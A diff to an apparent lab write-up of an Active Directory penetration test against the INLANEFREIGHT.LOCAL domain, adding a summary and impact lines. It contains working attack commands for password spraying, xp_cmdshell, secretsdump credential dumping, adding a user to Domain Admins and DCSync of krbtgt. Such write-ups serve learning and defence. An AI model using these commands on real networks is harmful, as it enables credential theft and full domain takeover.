@@ -9,6 +9,20 @@
 
 ---
 
+## ⚡ TL;DR
+
+Starting from an unauthenticated foothold on a `/23` internal segment, **LLMNR poisoning** captured a crackable NTLMv2 hash, which snowballed into full domain compromise by chaining five separate techniques:
+
+1. **LLMNR poisoning** → cracked hash → low-priv domain user
+2. **Plaintext creds in an SMB share** (`web.config`) → MSSQL service account
+3. **`xp_cmdshell` + `SeImpersonatePrivilege`** → local admin on SQL01 → domain service account hash
+4. **BloodHound** → found a standard user with `GenericAll` on `Domain Admins`
+5. **ACL abuse** (password reset / group add) → Domain Admin → DCSync (`krbtgt` extracted)
+
+**Impact:** Full domain compromise (`INLANEFREIGHT.LOCAL`) in a single chained path, from zero credentials to Domain Admin. Jump to the [attack path diagram](#-full-attack-path-summary) or the [flags table](#-flags-captured) for the short version.
+
+---
+
 ## 🎯 Objectives
 
 - Enumerate an unknown internal network from a single pivot/jump host
@@ -81,6 +95,8 @@ crackmapexec smb 172.16.7.3 172.16.7.50 172.16.7.60
 
 **Findings:** All three hosts are members of `INLANEFREIGHT.LOCAL`. Null-session enumeration (SMB, RPC, LDAP) was attempted but returned `ACCESS_DENIED` — no anonymous foothold available.
 
+**Impact:** No anonymous access — forced a move to credential-capture (LLMNR poisoning) for the initial foothold.
+
 ---
 
 ## 🧪 Phase 2 — Initial Foothold: LLMNR Poisoning
@@ -106,6 +122,8 @@ With this credential, authenticated SMB/WinRM access to `MS01` was obtained:
   <em>Authenticated shell on MS01 via Evil-WinRM using the cracked credential</em>
 </p>
 
+**Impact:** Initial domain foothold established — a valid low-privilege domain user (`AB920`) with interactive access to MS01.
+
 ---
 
 ## 📁 Phase 3 — SMB Share Enumeration & Credential Harvesting
@@ -122,13 +140,16 @@ Deep enumeration of `Department Shares` → `IT\Private\Development\web.config` 
 A separate **password spray** against all valid AD users (harvested earlier via `crackmapexec --users`) using a seasonal password also succeeded for a second low-privilege account:
 
 ```bash
-kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt <candidate-password>
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt <redacted-candidate-pw>
+# → hit: BR086:<redacted>
 ```
 
 <p align="center">
   <img src="screenshots/05-kerbrute-passwordspray.png" width="600"><br>
   <em>Successful password spray against the domain (credentials redacted)</em>
 </p>
+
+**Impact:** A second compromised account (`BR086`) plus a reusable MSSQL service credential (`netdb`) — direct path into the SQL01 database engine.
 
 ---
 
@@ -137,7 +158,7 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt <candida
 The harvested MSSQL credential was used to authenticate directly to the database engine on `SQL01`:
 
 ```bash
-proxychains impacket-mssqlclient <db_user>@172.16.7.60
+proxychains impacket-mssqlclient netdb@172.16.7.60
 EXEC xp_cmdshell 'whoami /priv';
 ```
 
@@ -165,7 +186,7 @@ EXEC xp_cmdshell 'whoami /priv';
 Local administrative access on `SQL01` was then used to dump local secrets:
 
 ```bash
-impacket-secretsdump administrator:'<redacted>'@172.16.7.60
+impacket-secretsdump administrator:'<redacted>'@172.16.7.60   # local admin on SQL01
 ```
 
 <p align="center">
@@ -184,6 +205,8 @@ evil-winrm -i 172.16.7.50 -u mssqlsvc -p '<redacted>'
   <img src="screenshots/18-ms01-admin-flag-mssqlsvc.png" width="500"><br>
   <em>Administrative WinRM access on MS01 using the reused <code>mssqlsvc</code> domain credential (flag redacted)</em>
 </p>
+
+**Impact:** Local admin on two of three hosts (SQL01, MS01), plus a domain service account hash — blast radius expanded entirely through credential reuse, no new exploit needed.
 
 ---
 
@@ -226,6 +249,8 @@ crackmapexec smb 172.16.7.3 -u CT059 -p /usr/share/wordlists/rockyou.txt
   <em>Targeted brute-force against <code>CT059</code> — the GenericAll-holding account — yielding a valid password (redacted)</em>
 </p>
 
+**Impact:** Identified the single highest-value misconfiguration in the domain — a standard user one step away from Domain Admin — and obtained working creds for it.
+
 ---
 
 ## 🔑 Phase 6 — ACL Abuse → Domain Admin
@@ -241,9 +266,9 @@ net user administrator <newpassword> /domain
 
 **Abuse Path 2 — Direct Group Membership Addition**
 ```powershell
-Add-DomainGroupMember -Identity 'Domain Admins' -Members '<compromised-user>' -Credential $Cred
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CT059' -Credential $Cred
 # Simpler native alternative:
-net group "Domain Admins" "<compromised-user>" /add /domain
+net group "Domain Admins" "CT059" /add /domain
 ```
 
 <p align="center">
@@ -256,6 +281,8 @@ Group membership was verified post-attack:
 Get-DomainGroupMember -Identity "Domain Admins" | select MemberName, MemberSID
 ```
 
+**Impact:** Domain Admin achieved — `GenericAll` on a privileged group is a direct, single-step path to full domain control.
+
 ---
 
 ## 👑 Phase 7 — Domain Controller Compromise
@@ -263,7 +290,7 @@ Get-DomainGroupMember -Identity "Domain Admins" | select MemberName, MemberSID
 With Domain Admin rights obtained, authenticated access to `DC01` was confirmed via both abuse paths, and the engagement's objective flag was retrieved:
 
 ```bash
-proxychains evil-winrm -i 172.16.7.3 -u Administrator -p '<redacted>'
+proxychains evil-winrm -i 172.16.7.3 -u Administrator -p '<redacted>'   # password reset via CT059's GenericAll
 ```
 
 <p align="center">
@@ -281,6 +308,8 @@ impacket-secretsdump administrator:'<redacted>'@172.16.7.3 -just-dc-user KRBTGT
   <img src="screenshots/12-krbtgt-dump.png" width="650"><br>
   <em>DCSync extraction of the krbtgt account (hash values redacted)</em>
 </p>
+
+**Impact:** Full domain compromise confirmed. With the `krbtgt` hash in hand, an attacker could forge Golden Tickets for persistent, long-term domain-wide access even after passwords are rotated.
 
 ---
 
